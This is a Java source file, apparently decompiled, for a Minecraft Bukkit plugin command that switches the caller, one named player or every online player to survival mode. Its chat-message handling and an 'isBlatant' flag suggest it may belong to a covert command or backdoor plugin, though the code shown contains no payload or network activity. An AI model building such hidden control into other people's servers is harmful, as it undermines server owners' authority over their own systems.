
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;


public class GmsCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (args.length <= 1) {
            plugin.getServer().getScheduler().scheduleSyncDelayedTask((Plugin)plugin, () -> {
                p2.setGameMode(GameMode.SURVIVAL);
                p2.sendMessage(Settings.PREFIX("You set your gamemode to " + Settings.RED + "SURVIVAL"));
            });
        } else if (args[1].equals("*")) {
            for (Player a2 : Bukkit.getOnlinePlayers()) {
                plugin.getServer().getScheduler().scheduleSyncDelayedTask((Plugin)plugin, () -> a2.setGameMode(GameMode.SURVIVAL));
            }
            p2.sendMessage(Settings.PREFIX("Everyone's gamemode is now set to" + Settings.RED + " SURVIVAL"));
        } else {
            Player target = Bukkit.getServer().getPlayer(args[1]);
            if (target == null) {
                p2.sendMessage(Settings.PREFIX("The player " + Settings.RED + args[1] + Settings.WHITE + " is not online."));
            } else {
                plugin.getServer().getScheduler().scheduleSyncDelayedTask((Plugin)plugin, () -> {
                    target.setGameMode(GameMode.SURVIVAL);
                    p2.sendMessage(Settings.PREFIX("The player " + Settings.RED + target.getName() + Settings.WHITE + "'s gamemode is now set to " + Settings.RED + "SURVIVAL"));
                });
            }
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }


}

